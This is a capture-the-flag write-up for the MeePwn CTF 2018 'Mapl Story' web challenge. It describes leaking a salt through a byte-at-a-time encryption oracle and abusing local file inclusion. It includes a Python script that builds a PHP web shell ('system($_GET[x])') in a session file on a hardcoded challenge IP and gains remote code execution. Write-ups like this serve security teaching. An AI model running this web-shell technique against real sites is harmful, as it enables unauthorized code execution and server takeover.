# Meepwn CTF 2018 Quals : Mapl Story

## Write-up
### 1. Leak Salt using hash length extension and LFI
After auditing the source code, I thought I can get the salt value using hash length extension attack and can check session file like “/?page=/var/lib/php/sessions/sess_[phpsessid] ” using LFI.

```php
function encryptData($data,$salt,$key)
{
        $encrypt=openssl_encrypt($data.$salt,"AES-128-ECB",$key);
        $raw=base64_decode($encrypt);
        $final=implode(unpack("H*", $raw));
        return $final;
}
```

```
"a" * 15 ==> 7d283b2b1ba95dce98028b4050d05342
"a" * 15 + "m" ==> 7d283b2b1ba95dce98028b4050d05342

"a" * 14 ==> 81884247e3b2d20e116693dbecd18350
"a" * 14 + "ms" ==> 81884247e3b2d20e116693dbecd18350 

"a" * 13 ==> 307e8207ca459a81410ce7c65f9ff922
"a" * 13 + "ms_" ==> 307e8207ca459a81410ce7c65f9ff922

"a" * 12 ==> a59a592e200aa967a954c3345f09e218
"a" * 12 + "ms_g" ==> a59a592e200aa967a954c3345f09e218

"a" * 11 ==> 3806f308e7d2da55cdf4d069f6763c76
"a" * 11 + "ms_g0" ==> 3806f308e7d2da55cdf4d069f6763c76
....
.....
== > ms_g00d_0ld_g4m3
```
After finding the salt value, and I was able to get the cookie(role) of admin.

### 2. make webshell at session file
Since we know about salt value, we could get upload directory path. 
Because of this, we could do RCE attack with LFI. But there were a length limit, so we used session file by writing 1 byte.

```py
from requests import get, post

url = "http://178.128.87.16/index.php?page=character.php"
Cookie = "PHPSESSID=3bjdg4g23pptdiauqio2o41i33; _role=a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054"
headers = {
    "Cookie": Cookie,
    "Content-Type": "application/x-www-form-urlencoded"
}
payload = "<?php system($_GET[x]); ?>"
start = True
for x in payload:
    if start == True:
        data = {
            "command": "<?=$$key[a]='{}';".format(x),
            "submit": "Send"
        }
        start=False
    else:
        data = {
            "command": "<?=$$key[a].='{}';".format(x),
            "submit": "Send"
        }
    c = post(url, headers=headers, data=data)
    c = get('http://178.128.87.16/?page=/var/www/html/upload/92ee8e47bbbb715348961650c7743fb4/command.txt&_SESSION', headers=headers)
    print c.text
```

Finally, we got a web shell and got a FLAG.

> flag : MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___}


